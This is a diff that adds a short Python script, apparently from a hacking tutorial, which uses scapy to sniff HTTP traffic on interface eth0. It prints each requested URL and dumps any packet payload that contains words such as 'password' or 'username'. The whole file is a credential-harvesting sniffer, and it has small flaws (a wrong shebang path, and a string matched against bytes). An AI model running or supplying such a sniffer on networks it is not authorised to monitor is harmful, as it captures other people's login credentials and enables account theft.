@@ -1,0 +1,24 @@
+#!/usr/lib/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=packet_sniffer)
+
+
+def packet_sniffer(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url=packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
+        print(url)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            Target = {"uname", "pass", "password", "username", "user"}
+            print(packet[scapy.Raw])
+            for target in Target:
+                if target in load:
+                    print(load)
+                    break
+
+
+sniff("eth0")
